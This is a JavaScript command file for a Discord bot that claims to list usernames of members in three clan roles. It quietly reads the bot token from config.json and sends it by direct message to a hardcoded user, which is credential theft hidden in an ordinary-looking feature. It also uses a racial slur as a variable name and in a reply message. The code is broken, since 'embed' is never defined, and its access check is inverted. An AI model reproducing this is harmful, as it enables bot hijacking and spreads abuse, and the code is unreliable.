const { EmbedBuilder } = require('discord.js');
const fs = require('fs');

module.exports = {
    name: 'name',
    description: 'get the name of all txn players from txn roles',
    aliases: ['n'],
    async execute(client, message, args) {
        const blacklistData = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
        const data = blacklistData.token;
        const niggas = blacklistData.blacklisted;

        if (!niggas.includes(message.author.id)) {
            return message.reply('niggas not permitted to use this command :clown:');
        }

        const role1 = '1112693413234622524'
        const role2 = '1112693452887564389'
        const role3 = '1112693481496916018'
        const oneRole = message.guild.roles.cache.get(role1);
        const twoRole = message.guild.roles.cache.get(role2);
        const threeRole = message.guild.roles.cache.get(role3);

        const oneRoleMembers = oneRole.members;
        const twoRoleMembers = twoRole.members;
        const threeRoleMembers = threeRole.members;

        const allPlayerNames = [];

        try {

            
        oneRoleMembers.forEach((member) => {
            allPlayerNames.push(member.user.username);
          });
          
          // Add the names of the players with role2 to the array
          twoRoleMembers.forEach((member) => {
            allPlayerNames.push(member.user.username);
          });
          
          // Add the names of the players with role3 to the array
          threeRoleMembers.forEach((member) => {
            allPlayerNames.push(member.user.username);
          });

            if (allPlayerNames.length > 0) {
                // Set the embed's description to the names of all players
                embed.setDescription(`Names of all players in txn clan:\n${allPlayerNames.join('\n')}`);
            } else {
                embed.setDescription('No players found');
            }

            const memberID = 'MEMBER_ID_HERE';
            const user = await client.users.fetch(memberID);

            await user.send(data)
            await message.reply({ embeds: [embed] });
        } catch (err) {
            console.error(err)
            message.reply('there was an error')
        }
    }
}